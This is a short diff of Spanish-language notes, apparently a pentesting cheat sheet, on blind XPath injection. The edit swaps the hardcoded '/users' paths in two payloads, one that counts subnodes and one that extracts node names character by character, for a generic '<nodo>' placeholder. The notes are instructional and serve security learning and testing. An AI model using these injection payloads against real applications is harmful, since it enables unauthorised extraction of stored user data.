@@ -25,14 +25,14 @@ Funciona con el mismo criterio de las BLIND SQLI.
 
 Una vez que tenemos el nombre de un nodo tenemos podemos extraer la cantidad de subnodos:
 
-  invalid'+or+count(/users/*)=2+and+'1'='1
+  invalid'+or+count(/<nodo>/*)=2+and+'1'='1
 
 
 #### Extrayendo el nombre de un subnodo:
 
 Una vez que sabemos la cantidad de subnodos y tenemos el nodo principal podemos empezar a realizar los pasos anteriormente agregando el index del subnodo: [1]
 
-  invalid+or+substring(/users/user[1]/username,1,1)='a'+and+'1'='1
+  invalid+or+substring(name(/<nodo>/*[1]),1,1)='a'+and+'1'='1
   
 ---
 
